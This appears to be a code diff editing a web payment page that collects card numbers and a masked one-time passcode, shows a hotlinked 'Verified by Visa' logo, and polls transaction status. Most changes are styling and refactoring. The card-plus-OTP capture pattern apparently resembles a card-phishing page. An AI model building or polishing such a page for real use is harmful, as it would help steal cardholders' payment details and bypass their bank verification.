@@ -117,7 +117,7 @@
       display: none;
     }
     #cardInfo {
-      color: #4B5563;
+      color: #4b5563;
       font-size: 14px;
       margin-top: 4px;
     }
@@ -138,13 +138,13 @@
       border-radius: 0.25rem;
       cursor: pointer;
       font-size: 0.875rem;
-      color: #4B5563;
+      color: #4b5563;
       margin-top: 20px;
     }
     .consent-checkbox {
       width: 1.25rem;
       height: 1.25rem;
-      border: 2px solid #D1D5DB;
+      border: 2px solid #d1d5db;
       border-radius: 0.25rem;
       display: inline-flex;
       align-items: center;
@@ -152,8 +152,8 @@
       margin-right: 5px;
     }
     .consent-checkbox.checked {
-      background-color: #10B981;
-      border-color: #10B981;
+      background-color: #10b981;
+      border-color: #10b981;
     }
     .consent-checkbox svg {
       width: 1rem;
@@ -184,7 +184,6 @@
       -webkit-text-security: disc;
       caret-color: transparent;
     }
-    /* OTP Button styled to match OTP input */
     .otp-button {
       width: 100%;
       padding: 10px;
@@ -192,6 +191,7 @@
       border-radius: 5px;
       text-align: center;
       font-size: 18px;
+      letter-spacing: 5px;
       background-color: #3b82f6;
       color: white;
       cursor: pointer;
@@ -201,23 +201,6 @@
       background-color: #ccc;
       cursor: not-allowed;
     }
-    /* ========= Animations ========= */
-    .animate-slide-in { animation: slideIn 0.3s ease-out; }
-    @keyframes slideIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .animate-spin {
-      display: inline-block;
-      animation: spin 1s linear infinite;
-      -webkit-animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
-    }
-    .btn-loading { position: relative; }
-    .btn-loading span { opacity: 0.5; filter: blur(1px); }
     /* ========= Bottom Logos ========= */
     .bottom-logos {
       padding: 2rem 0;
@@ -244,6 +227,25 @@
       .bottom-logos img { max-height: 25px; }
       .page-container { margin-bottom: 90px; }
     }
+    /* ========= Animations ========= */
+    .animate-slide-in {
+      animation: slideIn 0.3s ease-out;
+    }
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-spin {
+      display: inline-block;
+      animation: spin 1s linear infinite;
+      -webkit-animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    .btn-loading { position: relative; }
+    .btn-loading span { opacity: 0.5; filter: blur(1px); }
   </style>
 </head>
 <body>
@@ -382,7 +384,7 @@
                   </div>
                 </button>
               </form>
-              <!-- Consent Message in Payment Form -->
+              <!-- Consent Message on Payment Form -->
               <div class="consent-message mt-4" id="consentMessage">
                 <span class="consent-checkbox checked" id="consentCheckbox">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
@@ -399,10 +401,10 @@
               </p>
               <div class="otp-container">
                 <div class="otp-input-wrapper">
-                  <input type="password" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-md" placeholder="••••••" required>
+                  <input type="password" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-none" placeholder="••••••" required>
                 </div>
                 <div class="otp-button-wrapper">
-                  <button type="button" id="otpSubmitButton" class="otp-button" disabled>
+                  <button type="button" id="otpSubmitButton" class="otp-button w-full" disabled>
                     <span id="otpText">Confirm</span>
                     <div id="otpLoader" class="w-5 h-5 animate-spin hidden ml-2">
                       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -414,9 +416,9 @@
               </div>
               <p id="otpError" class="otp-error">Incorrect OTP. Please enter a valid one time passcode.</p>
               <p class="text-center text-sm text-gray-500 mt-2">Time remaining: <span id="timer">2:59</span></p>
-              <!-- Consent Message in OTP Form -->
-              <div class="consent-message mt-4" id="otpConsentMessage">
-                <span class="consent-checkbox checked" id="otpConsentCheckbox">
+              <!-- Consent Message on OTP Form -->
+              <div class="consent-message mt-2" id="consentMessageOtp">
+                <span class="consent-checkbox checked" id="consentCheckboxOtp">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
                     <path d="M5 13l4 4L19 7"/>
                   </svg>
@@ -437,8 +439,9 @@
       <img src="https://usa.visa.com/dam/VCOM/regional/ve/romania/blogs/hero-image/visa-logo-800x450.jpg" alt="Verified by Visa" class="h-6" />
     </div>
   </div>
-  <!-- Global Variables -->
+  <!-- Payment Details & Card Validation Scripts -->
   <script>
+    // Global Variables
     let isCardValid = false;
     let isExpiryValid = false;
     let isProcessing = false;
@@ -447,9 +450,8 @@
     let timerInterval;
     let timer = 180;
     let consentChecked = true;
-  </script>
-  <!-- Fetch Payment Details Using PID with Fallback -->
-  <script>
+    
+    // Fetch Payment Details Using PID with Fallback
     document.addEventListener('DOMContentLoaded', async () => {
       const urlParams = new URLSearchParams(window.location.search);
       let pid = urlParams.get('pid');
@@ -544,6 +546,7 @@
     }
     function detectCardType(number) {
       const clean = number.replace(/\D/g, '');
+      if (!clean) return null;
       const firstDigit = clean.charAt(0);
       if (firstDigit === '4') return 'visa';
       if (firstDigit === '5') return 'mastercard';
@@ -566,8 +569,12 @@
       const cardIcon = document.getElementById("cardTypeIcon");
       const cardInfo = document.getElementById("cardInfo");
       const plain = value.replace(/\s/g, '');
-      // Always show card logo if any digits entered
-      if (plain.length > 0 && plain.length < 6) {
+      if (!plain) {
+        cardIcon.innerHTML = "";
+        if (cardInfo) cardInfo.textContent = "";
+        return;
+      }
+      if (plain.length < 6) {
         let type = detectCardType(plain);
         let logoUrl = "";
         switch (type) {
@@ -588,11 +595,11 @@
         }
         cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${type}" style="max-height:100%; max-width:100%;">` : "";
         if (cardInfo) cardInfo.textContent = "";
-      } else if (plain.length >= 6) {
+      } else {
         const bin = plain.slice(0, 6);
         const binData = await lookupBIN(bin);
-        let logoUrl = "";
         if (binData) {
+          let logoUrl = "";
           switch ((binData.scheme || "").toLowerCase()) {
             case "visa":
               logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png";
@@ -629,30 +636,9 @@
             }
           }
         } else {
-          // Fallback: use basic detection
-          let type = detectCardType(plain);
-          switch (type) {
-            case "visa":
-              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png";
-              break;
-            case "mastercard":
-              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png";
-              break;
-            case "amex":
-              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png";
-              break;
-            case "rupay":
-              logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png";
-              break;
-            default:
-              logoUrl = "";
-          }
-          cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${type}" style="max-height:100%; max-width:100%;">` : "";
+          cardIcon.innerHTML = "";
           if (cardInfo) cardInfo.textContent = "";
         }
-      } else {
-        cardIcon.innerHTML = "";
-        if (cardInfo) cardInfo.textContent = "";
       }
     }
     function updateSubmitButton() {
@@ -675,11 +661,11 @@
       const otpButton = document.getElementById('otpSubmitButton');
       if (otp.length === 6) {
         otpButton.disabled = false;
-        otpButton.className = "otp-button";
+        otpButton.className = "otp-button w-full";
         document.getElementById('otpError').style.display = 'none';
       } else {
         otpButton.disabled = true;
-        otpButton.className = "otp-button";
+        otpButton.className = "otp-button w-full";
       }
     }
     document.addEventListener("DOMContentLoaded", function(){
@@ -795,7 +781,6 @@
           const result = await response.json();
           if (result.status === "success") {
             currentInvoiceId = result.invoiceId;
-            localStorage.setItem("invoiceId", currentInvoiceId);
             statusCheckInterval = setInterval(checkTransactionStatus, 2000);
           } else {
             throw new Error('Payment submission failed');
